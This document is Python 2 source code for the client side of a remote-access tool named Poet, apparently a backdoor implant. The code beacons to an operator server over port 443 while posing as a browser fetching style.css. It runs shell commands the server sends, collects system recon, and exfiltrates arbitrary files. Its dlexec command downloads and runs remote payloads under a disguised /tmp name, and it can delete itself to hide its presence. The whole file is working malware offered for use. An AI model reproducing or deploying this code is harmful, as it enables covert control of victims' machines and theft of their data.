#!/usr/bin/python2.7

import os
import re
import sys
import stat
import time
import zlib
import base64
import random
import select
import socket
import struct
import os.path
import urllib2
import argparse
import logging as log
import subprocess as sp
from datetime import datetime

PREFIX_LEN = 4
SIZE = 4096
UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'


class PoetSocket(object):
    """Socket wrapper for client/server communications.

    Attributes:
        s: socket instance

    Socket abstraction which uses the convention that the message is prefixed
    by a big-endian 32 bit value indicating the length of the following base64
    string.
    """

    def __init__(self, s):
        self.s = s

    def close(self):
        self.s.close()

    def exchange(self, msg):
        self.send(msg)
        return self.recv()

    def send(self, msg):
        """Send message over socket."""

        pkg = base64.b64encode(msg)
        pkg_size = struct.pack('>i', len(pkg))
        sent = self.s.sendall(pkg_size + pkg)
        if sent:
            raise socket.error('socket connection broken')

    def recv(self):
        """Receive message from socket.

        Returns:
            The message sent from client.
        """

        chunks = []
        bytes_recvd = 0

        # In case we don't get all 4 bytes of the prefix the first recv(),
        # this ensures we'll eventually get it intact
        while bytes_recvd < PREFIX_LEN:
            chunk = self.s.recv(PREFIX_LEN)
            if not chunk:
                raise socket.error('socket connection broken')
            chunks.append(chunk)
            bytes_recvd += len(chunk)

        initial = ''.join(chunks)
        msglen, initial = (struct.unpack('>I', initial[:PREFIX_LEN])[0],
                           initial[PREFIX_LEN:])
        del chunks[:]
        bytes_recvd = len(initial)
        chunks.append(initial)
        while bytes_recvd < msglen:
            chunk = self.s.recv(min((msglen - bytes_recvd, SIZE)))
            if not chunk:
                raise socket.error('socket connection broken')
            chunks.append(chunk)
            bytes_recvd += len(chunk)
        return base64.b64decode(''.join(chunks))


class PoetSocketClient(PoetSocket):
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
        super(PoetSocketClient, self).__init__(self.s)


class PoetClient(object):
    """Core client functionality.

    Receives commands from server, does bidding, responds.

    Note: In any function with `inp' as a parameter, `inp' refers to the
    command string sent from the server.

    Attributes:
        host: server ip address
        port: server port
    """

    def __init__(self, host, port):
        self.host = host
        self.port = port

    def start(self):
        """Core Poet client functionality."""

        s = PoetSocketClient(self.host, self.port)
        while True:
            try:
                inp = s.recv()
                if inp == 'fin':
                    break
                elif inp == 'getprompt':
                    s.send(self.get_prompt())
                elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                    s.send(self.execute(inp))
                elif inp == 'recon':
                    s.send(zlib.compress(self.recon()))
                elif inp.startswith('shell '):
                    self.shell(inp, s)
                    s.send('shelldone')
                elif inp.startswith('exfil '):
                    try:
                        with open(os.path.expanduser(inp[6:])) as f:
                            s.send(zlib.compress(f.read()))
                    except IOError as e:
                        s.send(e.strerror)
                elif inp == 'selfdestruct':
                    try:
                        if not args.delete:
                            os.remove(__file__)
                        if __file__.strip('./') not in os.listdir('.'):
                            s.send('boom')
                            sys.exit()
                        else:
                            raise Exception('client not deleted')
                    except Exception as e:
                        s.send(str(e.message))
                elif inp.startswith('dlexec '):
                    try:
                        self.dlexec(inp)
                        s.send('done')
                    except Exception as e:
                        s.send(str(e.message))
                elif inp.startswith('chint'):
                    self.chint(s, inp)
                else:
                    s.send('Unrecognized')
            except socket.error as e:
                if e.message == 'too much data!':
                    s.send('psh : ' + e.message)
                else:
                    raise
        s.close()

    def execute(self, inp):
        """Handle server `exec' command.

        Execute specially formatted input string and return specially formatted
        response.
        """

        out = ''
        cmds = self.parse_exec_cmds(inp)
        for cmd in cmds:
            cmd_out = self.cmd_exec(cmd)
            out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
        return out

    def recon(self):
        """Executes recon commands."""

        ipcmd = 'ip addr' if 'no' in self.cmd_exec('which ifconfig') else 'ifconfig'
        exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
        return self.execute(exec_str)

    def dlexec(self, inp):
        """Handle server `dlexec' command.

        Download file from internet, save to /tmp and execute.
        """

        r = urllib2.urlopen(inp.split()[1])
        rand = str(random.random())[2:6]
        tmp = '/tmp/tmux-{}'.format(rand)
        with open(tmp, 'w') as f:
            f.write(r.read())
            os.fchmod(f.fileno(), stat.S_IRWXU)
        sp.Popen(tmp, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)

    def chint(self, s, inp):
        """Handle server `chint' command.

        Send back the current delay interval or set it to new value.
        """

        if inp == 'chint':
            # no arg, so just send back the interval
            s.send(str(args.interval))
        else:
            # set interval to arg
            try:
                num = int(inp[6:])
                if num < 1 or num > 60*60*24:
                    msg = 'Invalid interval time.'
                else:
                    args.interval = num
                    msg = 'done'
                s.send(msg)
            except Exception as e:
                s.send(str(e.message))


    def shell(self, inp, s):
        """Psh `shell' command client-side.

        Create a subprocess for command and line buffer command output to
        server while listening for signals from server.

        Args:
            s: PoetSocketClient instance
        """

        inp = inp[6:]  # get rid of 'shell ' prefix

        # handle cd builtin
        if re.search('^cd( .+)?$', inp):
            if inp == 'cd':
                os.chdir(os.path.expanduser('~'))
            else:
                try:
                    os.chdir(os.path.expanduser(inp[3:]))
                except OSError as e:
                    s.send('cd: {}\n'.format(e.strerror))
            return

        # everything else
        proc = sp.Popen(inp, stdout=sp.PIPE, stderr=sp.STDOUT, shell=True)
        while True:
            readable = select.select([proc.stdout, s.s], [], [], 30)[0]
            for fd in readable:
                if fd == proc.stdout:  # proc has stdout/err to send
                    output = proc.stdout.readline()
                    if output:
                        s.send(output)
                    else:
                        return
                elif fd == s.s:  # remote signal from server
                    sig = s.recv()
                    if sig == 'shellterm':
                        proc.terminate()
                        return

    def cmd_exec(self, cmd):
        """Light wrapper over subprocess.Popen()."""

        return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                        shell=True).communicate()[0]

    def get_prompt(self):
        """Create shell prompt.

        Using current user and hostname, create shell prompt for server `shell'
        command.
        """
        user = self.cmd_exec('whoami').strip()
        hn = self.cmd_exec('hostname').strip()
        end = '#' if user == 'root' else '$'
        return '{}@{} {} '.format(user, hn, end)

    def parse_exec_cmds(self, inp):
        """Parse string provided by server `exec' command.

        Convert space delimited string with commands to execute in quotes, for
        example ("ls -l" "cat /etc/passwd") into list with commands as strings.

        Returns:
            List of commands to execute.
        """

        cmds = []
        inp = inp[5:]
        num_cmds = inp.count('"') / 2
        for i in range(num_cmds):
            first = inp.find('"')
            second = inp.find('"', first+1)
            cmd = inp[first+1:second]
            cmds.append(cmd)
            inp = inp[second+2:]
        return cmds


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='IP', type=str)
    parser.add_argument('interval', metavar='INTERVAL', type=int, help='(s)')
    parser.add_argument('-p', '--port')
    parser.add_argument('-v', '--verbose', action="store_true")
    parser.add_argument('-d', '--delete', action="store_true")
    return parser.parse_args()


def is_active(host, port):
    """Check if server is active.

    Send HTTP GET for a fake /style.css which server will respond to if it's
    alive.

    Args:
        host: server ip address
        port: server port

    Returns:
        Boolean for server state.
    """

    try:
        url = 'http://{}:{}/style.css'.format(host, port)
        req = urllib2.Request(url, headers={'User-Agent': UA})
        f = urllib2.urlopen(req)
        if f.code == 200:
            return True
    except urllib2.URLError:
        pass
    return False


def main():
    global args
    args = get_args()

    if args.verbose:
        log.basicConfig(format='%(message)s', level=log.INFO)
    else:
        log.basicConfig(format='%(message)s')

    if args.delete:
        log.info('[+] Deleting client.')
        os.remove(__file__)

    HOST = args.host
    PORT = int(args.port) if args.port else 443

    log.info(('[+] Poet started with interval of {} seconds to port {}.' +
              ' Ctrl-c to exit.').format(args.interval, PORT))

    try:
        while True:
            if is_active(HOST, PORT):
                log.info('[+] ({}) Server is active'.format(datetime.now()))
                PoetClient(HOST, PORT).start()
            else:
                log.info('[!] ({}) Server is inactive'.format(datetime.now()))
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print
        log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
    except socket.error as e:
        log.info('[!] ({}) Socket error: {}'.format(datetime.now(), e.message))
        log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
        sys.exit(0)

if __name__ == '__main__':
    main()
